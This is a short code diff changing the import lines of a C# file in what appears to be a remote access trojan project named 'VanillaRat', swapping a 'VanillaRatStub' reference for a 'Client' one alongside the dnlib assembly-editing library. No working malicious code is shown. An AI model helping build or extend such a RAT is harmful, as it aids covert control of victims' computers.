@@ -1,8 +1,8 @@
-﻿using dnlib.DotNet;
+﻿using Client;
+using dnlib.DotNet;
 using System;
 using System.IO;
 using System.Linq;
-using VanillaRatStub;
 
 namespace VanillaRat.Classes
 {
